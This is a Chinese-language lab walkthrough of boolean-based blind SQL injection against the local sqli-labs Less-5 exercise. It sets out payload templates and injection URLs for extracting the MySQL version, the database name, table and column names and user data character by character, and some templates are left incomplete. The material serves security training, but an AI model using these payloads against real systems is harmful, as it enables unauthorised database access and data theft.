# 1.确定版本号

```javascript
and left(version(),1)=NUM
```

列如：

http://127.0.0.1/sql-labs/Less-5/?id=1' and left(version(),1)=5--+



# 2.确定数据库长度

```javascript
and length(database())=NUM
```

列如：

http://127.0.0.1/sql-labs/Less-5/?id=1' and length(database())=8--+



# 3.逐字段猜解数据库名

```javascript
and left(database())=字母
```

列如：

http://127.0.0.1/sql-labs/Less-5/?id=1' and left(database(),1)='s' --+

http://127.0.0.1/sql-labs/Less-5/?id=1' and left(database(),2)='se' --+



# 4.逐字段猜解表名

```javascript
and ascii(substr((select table_name from information_schema.tables 
where table_schema=DATABASE_NAME limit 0,1),1,1))=NUM(a=97,A=65)
```

列如：

http://127.0.0.1/sql-labs/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database()  limit 0,1),1,1))=101--+



## 获取该表第二个字段：

http://127.0.0.1/sql-labs/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database()  limit 0,1),2,1))=109--+



## 获取第二个表第一个字段：

http://127.0.0.1/sql-labs/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database()  limit 1,1),1,1))=114 --+



# 5.猜解指定表列名

```javascript
and+ascii(substr((select+column_name+from+information_schema.columns+
where+table_name='TABLE_NAME'+limit NUM(第几列),1),NUM(该列名的第几个字符),1))=--+
```

http://127.0.0.1/sql-labs/Less-5/?id=1'+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='users'+limit 0,1),1,1))=--+



## 获取该列名第二个字段：

http://127.0.0.1/sql-labs/Less-5/?id=1'+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='users'+limit 0,1),2,1))=--+



## 获取第二个列名第一个字段：

http://127.0.0.1/sql-labs/Less-5/?id=1'+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='users'+limit 1,1),2,1))=--+



# 6.获取指定列内容

```javascript
and+ORD(MID((SELECT IFNULL(CAST(COLUMN_NAME(字段名) AS CHAR),0x20)FROM
security.users ORDER BY id LIMIT 0,1),NUM(第几个字段),1))=NUM(ascii码)--+
```



http://127.0.0.1/sql-labs/Less-5/?id=1'+and+ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+



## 获取第二个字段：

http://127.0.0.1/sql-labs/Less-5/?id=1'+and+ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),2,1))=68--+

